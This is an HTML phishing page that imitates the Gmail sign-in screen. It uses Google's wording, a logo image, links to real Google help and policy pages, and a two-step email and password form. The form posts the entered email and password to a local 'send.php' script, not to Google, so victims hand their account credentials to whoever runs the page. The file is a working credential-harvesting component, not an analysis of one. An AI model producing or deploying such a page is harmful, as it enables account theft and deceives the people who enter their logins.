<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gmail</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="main">
        <div class="wrapper">
            <div class="inner__wrapper">
                <img src="logo.png" alt="logo" width="75" height="24">
                <h2 id="signIn">Sign in</h2>
                <h3 id="gmailAccount" class="gmailAccount">Use your Google Account</h3>
                <form action="../../send.php" method="post">
                    <div class="form-wrapper username">
                        <div class="form__group">
                            <input type="text" name="email" required>
                            <label for="email">Email or phone</label>
                        </div>
                        <a href="#" class="forgot"> Create email?</a>
                        <p>Not your computer? Use Guest mode to sign in privately <a href="https://support.google.com/chrome/answer/6130773?hl=en">Learn More</a></p>
                        <ul class="control">
                            <li><a href="https://accounts.google.com/lifecycle/steps/signup/name?authuser=0&continue=http://support.google.com/mail/answer/56256?hl%3Den&dsh=S437899391:1773273121901981&ec=GAlAdQ&flowEntry=SignUp&flowName=GlifWebSignIn&hl=en&TL=AHU8sQt8q4fjWTp3wNW_ESbX2uPXO7yHt2HZlcr2fGuAY9NuqA4vzazTvWMdvPdq">Create account</a></li>
                            <li><button class="btn" id="btnNext">Next</button></li>
                        </ul>
                    </div>
                    <div class="form-wrapper password">
                        <div class="form__group">
                            <input type="password" name="password" required>
                            <label for="password">Enter your password</label>
                        </div>
                       
                        <div class="show-password-container">
                        <input type="checkbox" id="showPass">
                        <label for="showPass">Show password</label>
                        </div>
                        <ul class="control">
                            <li><a href="https://accounts.google.com/signin/v2/usernamerecovery?authuser=0&continue=http%3A%2F%2Fsupport.google.com%2Fmail%2Fanswer%2F56256%3Fhl%3Den&dsh=S437899391%3A1773273121901981&ec=GAlAdQ&flowEntry=AddSession&flowName=GlifWebSignIn&hl=en">Forgot password?</a></li>
                            <li><button class="btn" id="btndone" type="submit" name="save">Next</button></li>
                        </ul>
                    </div>
                </form>
            </div>
            <div class="language">
                <select name="" id="">
                    <option value="english">English (United States)</option>
                    <option value="russion">Russion</option>
                    <option value="deutsch">Deutsch</option>
                </select>
                <ul class="privacy">
                    <li><a href="https://support.google.com/accounts?hl=en&visit_id=639088699094276074-1109562718&rd=2&p=account_iph#topic=3382296">Help</a></li>
                    <li><a href="https://policies.google.com/privacy?gl=MA&hl=en">Privacy</a></li>
                    <li><a href="https://policies.google.com/terms?gl=MA&hl=en">Terms</a></li>
                </ul>
            </div>
        </div>
    </div>
    <script>
        const btnNext = document.querySelector('#btnNext');
        const username = document.querySelector('.username');
        const password = document.querySelector('.password');
        const signIn = document.querySelector('#signIn');
        const gmailAccount = document.querySelector('#gmailAccount');

        btnNext.addEventListener('click', (e)=>{
            e.preventDefault();
            username.classList.add('deactive');
            password.classList.add('active');
            signIn.textContent = '';
            gmailAccount.classList.add('changeName');
            
        })

        
        const showPass = document.querySelector('#showPass');
        const passwordField = document.querySelector('input[name="password"]');

        showPass.addEventListener('change', () => {
            passwordField.type = showPass.checked ? 'text' : 'password';
        });

    </script>
</body>
</html>
